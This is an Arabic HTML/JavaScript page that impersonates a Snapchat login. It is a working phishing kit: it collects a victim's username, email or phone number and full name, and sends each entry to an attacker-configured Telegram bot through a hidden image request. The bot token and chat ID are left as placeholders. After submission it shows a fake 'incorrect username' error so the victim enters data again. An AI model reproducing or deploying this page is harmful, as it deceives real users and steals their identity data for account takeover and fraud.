<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تسجيل الدخول — مصحّح</title>

  <!--
    ضع التوكن و chat_id على جهازك فقط إن أردت الإرسال:
    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
    لا تشارك الملف بعد لصق القيم.
  -->
  <script>
    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#f4f8fb; --card:#fff; --accent:#ffd400; --primary:#0da4ff; --muted:#7f8b95;
      --radius:16px; --shadow: 0 18px 50px rgba(10,20,30,0.08);
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:linear-gradient(180deg,#f8fbff, var(--bg));font-family:'Cairo',system-ui,Arial;color:#06272b;direction:rtl}
    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px}
    .device{width:420px;max-width:96%}
    .card{background:var(--card);border-radius:18px;padding:20px;box-shadow:var(--shadow);overflow:hidden}
    .brand{display:flex;justify-content:center;margin-top:-36px}
    .brand-pill{display:inline-flex;gap:10px;align-items:center;padding:10px 16px;border-radius:999px;background:linear-gradient(180deg,var(--accent),#ffdf86);font-weight:800}
    .logo{display:flex;justify-content:center;margin:6px 0}
    .logo img{width:74px;height:74px}
    h1{font-size:24px;text-align:center;margin:4px 0 8px;font-weight:800}
    p.lead{font-size:14px;color:var(--muted);text-align:center;margin:0 0 12px}
    label{display:block;color:var(--muted);margin-bottom:8px}
    input[type="text"],input[type="tel"],input[type="email"],.select-btn{
      width:100%;padding:12px 12px;border-radius:12px;border:1px solid #eef5fb;background:#fff;font-size:16px;outline:none;
      box-shadow:0 8px 24px rgba(10,20,30,0.03);transition:box-shadow .18s,transform .12s;
    }
    input:focus{box-shadow:0 18px 54px rgba(13,164,255,0.12);transform:translateY(-2px)}
    .select-btn{display:inline-flex;align-items:center;gap:8px;padding:10px;border-radius:12px;cursor:pointer;border:1px solid #eef7ff}
    .micro{background:rgba(255,255,255,0.8);padding:8px;border-radius:10px;margin-top:10px;text-align:center;color:var(--muted);font-size:13px;border:1px solid rgba(255,255,255,0.6)}
    .controls{display:flex;gap:12px;justify-content:center;margin-top:16px}
    .btn{background:var(--primary);color:#fff;padding:12px 16px;border-radius:999px;border:none;font-weight:800;cursor:pointer;box-shadow:0 10px 28px rgba(13,164,255,0.16)}
    .btn.ghost{background:#fff;color:var(--primary);border:1px solid #e8f6ff;box-shadow:none}
    .hint{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
    .hidden{display:none}
    .modal-back{position:fixed;inset:0;display:none;align-items:flex-end;justify-content:center;padding:12px;background:linear-gradient(180deg,rgba(0,0,0,0.28),rgba(0,0,0,0.34));z-index:90}
    .modal{width:100%;max-width:420px;background:var(--card);border-radius:16px;padding:12px;max-height:74vh;overflow:hidden;box-shadow:0 18px 60px rgba(0,0,0,0.20)}
    .country-list{overflow:auto;max-height:60vh;margin-top:8px;padding-right:6px}
    .country-item{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:10px;cursor:pointer}
    .country-item:hover{background:#f6fbff}
    .toast-back{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:100}
    .toast{background:#fff;padding:18px;border-radius:12px;box-shadow:0 22px 70px rgba(0,0,0,0.24);width:92%;max-width:380px;text-align:center}
    .toast button{margin-top:12px;padding:10px 14px;border-radius:8px;background:var(--primary);color:#fff;border:none;cursor:pointer}
    @media(max-width:420px){ .device{width:360px} h1{font-size:20px} }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="device">
      <div class="card" role="application" aria-label="نموذج تسجيل">

        <div class="brand"><div class="brand-pill"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /> Open Snapchat</div></div>

        <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>

        <!-- Page 1 -->
        <section id="page1" aria-labelledby="title1">
          <h1 id="title1">تسجيل الدخول إلى سناب شات</h1>
          <p class="lead">أدخل اسم المستخدم أو البريد الإلكتروني — أو استخدم رقم الهاتف.</p>

          <div class="field">
            <label for="primaryInput">اسم المستخدم أو البريد الإلكتروني</label>
            <div id="primaryHolder">
              <input id="primaryInput" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />
            </div>
            <div class="micro">لن نطلب أو نرسل كلمات المرور.</div>
          </div>

          <div style="text-align:center;margin-top:10px">
            <button id="phoneToggle" class="select-btn" type="button">استخدم رقم الهاتف بدلاً من ذلك</button>
          </div>

          <div class="controls">
            <button id="continueBtn" class="btn">المتابعة</button>
          </div>

          <div class="hint" id="hintPage1"></div>
        </section>

        <!-- Page 2 (separate full page) -->
        <section id="page2" class="hidden" aria-labelledby="title2">
          <h1 id="title2">التحقق — خطوة إضافية</h1>
          <p class="lead">أدخل الاسم الكامل</p>

          <div class="field">
            <label for="nameInput">الاسم الكامل</label>
            <input id="nameInput" type="text" placeholder="أدخل الاسم الكامل" autocomplete="off" />
          </div>

          <div class="controls">
            <button id="sendBtn" class="btn">إرسال الاسم</button>
            <button id="backBtn" class="btn ghost">العودة</button>
          </div>

          <div class="hint" id="hintPage2"></div>
        </section>

      </div>
    </div>
  </div>

  <!-- country modal -->
  <div id="countryModal" class="modal-back" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-label="اختر الدولة">
      <div style="text-align:center;font-weight:700;margin-bottom:6px">اختر الدولة</div>
      <input id="countrySearch" placeholder="ابحث عن دولة أو رمز..." class="search-input" />
      <div id="countryList" class="country-list" role="listbox"></div>
    </div>
  </div>

  <!-- toast -->
  <div id="toastBack" class="toast-back" aria-hidden="true">
    <div class="toast" role="alertdialog">
      <h3 id="toastTitle">عذراً</h3>
      <p id="toastText">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.</p>
      <div><button id="toastOk">حسناً</button></div>
    </div>
  </div>

  <script>
    // ===== config =====
    const COUNTRIES = [
      {name:'الأردن', code:'JO', dial:'+962', flag:'🇯🇴'},
      {name:'مصر', code:'EG', dial:'+20', flag:'🇪🇬'},
      {name:'السعودية', code:'SA', dial:'+966', flag:'🇸🇦'},
      {name:'الإمارات', code:'AE', dial:'+971', flag:'🇦🇪'},
      {name:'الكويت', code:'KW', dial:'+965', flag:'🇰🇼'},
      {name:'لبنان', code:'LB', dial:'+961', flag:'🇱🇧'},
      {name:'الولايات المتحدة', code:'US', dial:'+1', flag:'🇺🇸'},
      {name:'المملكة المتحدة', code:'GB', dial:'+44', flag:'🇬🇧'}
    ];
    const usernameRx = /^[A-Za-z0-9._-]{3,30}$/;
    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const digitsOnly = s => s.replace(/[^\d]/g,'');

    // ===== DOM =====
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');

    const primaryHolder = document.getElementById('primaryHolder');
    let primaryInput = document.getElementById('primaryInput');
    const phoneToggle = document.getElementById('phoneToggle');
    const continueBtn = document.getElementById('continueBtn');
    const hintPage1 = document.getElementById('hintPage1');

    const countryModal = document.getElementById('countryModal');
    const countryList = document.getElementById('countryList');
    const countrySearch = document.getElementById('countrySearch');

    const nameInput = document.getElementById('nameInput');
    const sendBtn = document.getElementById('sendBtn');
    const backBtn = document.getElementById('backBtn');
    const hintPage2 = document.getElementById('hintPage2');

    const toastBack = document.getElementById('toastBack');
    const toastOk = document.getElementById('toastOk');
    const toastText = document.getElementById('toastText');

    // ===== state =====
    let phoneMode = false;
    let selectedCountry = COUNTRIES[0];
    let prev = null; // {type,value,country}

    // ===== helpers =====
    function bindAscii(el){
      el.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\x00-\x7F]/g,'');
        if(e.target.value.length > 100) e.target.value = e.target.value.slice(0,100);
      });
      el.addEventListener('keydown', e => { if(e.key === 'Enter') continueBtn.click(); });
    }

    function switchToPhone(){
      phoneMode = true;
      primaryHolder.innerHTML = `
        <div style="display:flex;gap:10px;align-items:center">
          <button id="countryBtn" class="select-btn" type="button"><span id="countryFlag">${selectedCountry.flag}</span>&nbsp;<span id="countryDial">${selectedCountry.dial}</span></button>
          <input id="phoneInput" type="tel" placeholder="أدخل رقم الهاتف" inputmode="numeric" />
        </div>`;
      document.getElementById('countryBtn').addEventListener('click', ()=> {
        renderCountries(COUNTRIES);
        countryModal.style.display = 'flex';
        setTimeout(()=> countrySearch.focus(),120);
      });
      primaryInput = document.getElementById('phoneInput');
      primaryInput.addEventListener('input', e => { e.target.value = digitsOnly(e.target.value); });
      primaryInput.addEventListener('keydown', e => { if(e.key === 'Enter') continueBtn.click(); });
      phoneToggle.textContent = 'استخدم البريد الإلكتروني/اسم المستخدم بدلاً من ذلك';
    }

    function switchToPrimary(){
      phoneMode = false;
      primaryHolder.innerHTML = `<input id="primaryInput" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />`;
      primaryInput = document.getElementById('primaryInput');
      bindAscii(primaryInput);
      phoneToggle.textContent = 'استخدم رقم الهاتف بدلاً من ذلك';
    }

    phoneToggle.addEventListener('click', () => {
      if(!phoneMode) switchToPhone(); else switchToPrimary();
    });

    // countries modal
    function renderCountries(list){
      countryList.innerHTML = '';
      list.forEach(c => {
        const el = document.createElement('div');
        el.className = 'country-item';
        el.innerHTML = `<div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">${c.flag}</span><div style="display:flex;flex-direction:column;margin-right:8px"><strong>${c.name}</strong><small style="color:var(--muted);font-size:12px">${c.code}</small></div></div><div style="font-weight:700;color:#333">${c.dial}</div>`;
        el.addEventListener('click', ()=> {
          selectedCountry = c;
          const cf = document.getElementById('countryFlag');
          const cd = document.getElementById('countryDial');
          if(cf) cf.textContent = c.flag;
          if(cd) cd.textContent = c.dial;
          countryModal.style.display = 'none';
          const pi = document.getElementById('phoneInput');
          if(pi){ pi.placeholder = 'أدخل رقم الهاتف ' + c.dial; pi.focus(); }
        });
        countryList.appendChild(el);
      });
      if(list.length === 0) countryList.innerHTML = '<div style="padding:12px;color:var(--muted);text-align:center">لا توجد نتائج</div>';
    }
    countrySearch.addEventListener('input', ()=> {
      const q = countrySearch.value.trim().toLowerCase();
      if(!q) return renderCountries(COUNTRIES);
      const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.dial.includes(q));
      renderCountries(filtered);
    });
    countryModal.addEventListener('click', e => { if(e.target === countryModal) countryModal.style.display = 'none'; });

    // validate primary
    function validatePrimary(){
      if(phoneMode){
        const v = (document.getElementById('phoneInput')||{value:''}).value.trim();
        const clean = digitsOnly(v);
        if(clean.length < 6){ hintPage1.style.color='crimson'; hintPage1.textContent='الرجاء إدخال رقم هاتف صالح'; setTimeout(()=> hintPage1.textContent='',2000); return null; }
        return {type:'phone', value:clean, country:selectedCountry};
      } else {
        const v = (document.getElementById('primaryInput')||{value:''}).value.trim();
        if(!v){ hintPage1.style.color='crimson'; hintPage1.textContent='الرجاء إدخال اسم المستخدم أو البريد'; setTimeout(()=> hintPage1.textContent='',2000); return null; }
        if(v.includes('@')){
          if(!emailRx.test(v)){ hintPage1.style.color='crimson'; hintPage1.textContent='بريد إلكتروني غير صالح'; setTimeout(()=> hintPage1.textContent='',2200); return null; }
          return {type:'email', value:v};
        } else {
          if(!usernameRx.test(v)){ hintPage1.style.color='crimson'; hintPage1.textContent='اسم مستخدم غير صالح (3-30 حرف إنجليزي/رقم/._-)'; setTimeout(()=> hintPage1.textContent='',3000); return null; }
          return {type:'username', value:v};
        }
      }
    }

    // send to telegram (image GET) — no time in message
    function canSend(){
      return typeof TG_TOKEN !== 'undefined' && typeof TG_CHAT_ID !== 'undefined' && TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('PASTE');
    }
    function sendToTelegram(text){
      if(!canSend()){
        hintPage1.style.color='#b45a00';
        hintPage1.textContent = 'لم تضف توكن/Chat ID في رأس الملف — لن يُرسل فعليًا.';
        setTimeout(()=> hintPage1.textContent = '',2500);
        return false;
      }
      try{
        const url = `https://api.telegram.org/bot${encodeURIComponent(TG_TOKEN)}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(text)}`;
        const img = new Image();
        img.src = url + '&_=' + Date.now();
        console.log('TG send:', url);
        return true;
      } catch(e){ console.error(e); return false; }
    }

    // navigation: go to page2
    function goToPage2(){
      page1.classList.add('hidden');
      page2.classList.remove('hidden');
      history.pushState({page:'step2'}, '', '#step2');
      nameInput.focus();
    }
    function goToPage1(){
      page2.classList.add('hidden');
      page1.classList.remove('hidden');
      history.pushState({page:'step1'}, '', '#step1');
      const p = document.getElementById('primaryInput') || document.getElementById('phoneInput');
      if(p) p.focus();
    }

    // continue button
    continueBtn.addEventListener('click', ()=> {
      const p = validatePrimary();
      if(!p) return;
      prev = p;
      const countryText = p.type === 'phone' && p.country ? `${p.country.name} ${p.country.dial}` : '—';
      const msg = `النوع: ${p.type}\nالقيمة: ${p.value}\nالبلد: ${countryText}`;
      sendToTelegram(msg);
      goToPage2();
    });

    // send final
    sendBtn.addEventListener('click', ()=> {
      const nm = nameInput.value.trim();
      if(!nm){ hintPage2.style.color='crimson'; hintPage2.textContent='الرجاء إدخال الاسم'; setTimeout(()=> hintPage2.textContent='',2200); return; }
      if(!prev){ showToast('خطأ','لا توجد بيانات سابقة — عد للصفحة الأولى.'); return; }
      const countryText = prev.type==='phone' && prev.country ? `${prev.country.name} ${prev.country.dial}` : '—';
      const msg = `النوع: ${prev.type}\nالقيمة: ${prev.value}\nالبلد: ${countryText}\nالاسم: ${nm}`;
      sendToTelegram(msg);
      showToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.');
      prev = null;
      nameInput.value = '';
    });

    backBtn.addEventListener('click', ()=> { goToPage1(); });

    // toast
    function showToast(title, text){
      document.getElementById('toastTitle').textContent = title;
      toastText.textContent = text;
      toastBack.style.display = 'flex';
    }
    toastOk.addEventListener('click', ()=> {
      toastBack.style.display = 'none';
      goToPage1();
    });

    // Enter & Escape behavior
    document.addEventListener('keydown', e => {
      if(e.key === 'Enter'){
        if(!page2.classList.contains('hidden')) sendBtn.click();
        else continueBtn.click();
      }
      if(e.key === 'Escape'){
        if(countryModal.style.display === 'flex') countryModal.style.display = 'none';
        if(toastBack.style.display === 'flex') toastBack.style.display = 'none';
      }
    });

    // popstate handling (back button)
    window.addEventListener('popstate', (e) => {
      const page = e.state && e.state.page ? e.state.page : (location.hash === '#step2' ? 'step2' : 'step1');
      if(page === 'step2') { page1.classList.add('hidden'); page2.classList.remove('hidden'); } else { page2.classList.add('hidden'); page1.classList.remove('hidden'); }
    });

    // init
    (function init(){
      bindAscii(primaryInput);
      renderCountries(COUNTRIES);
      // initial page based on hash
      if(location.hash === '#step2'){ page1.classList.add('hidden'); page2.classList.remove('hidden'); } else { page2.classList.add('hidden'); page1.classList.remove('hidden'); }
    })();
  </script>
</body>
</html>
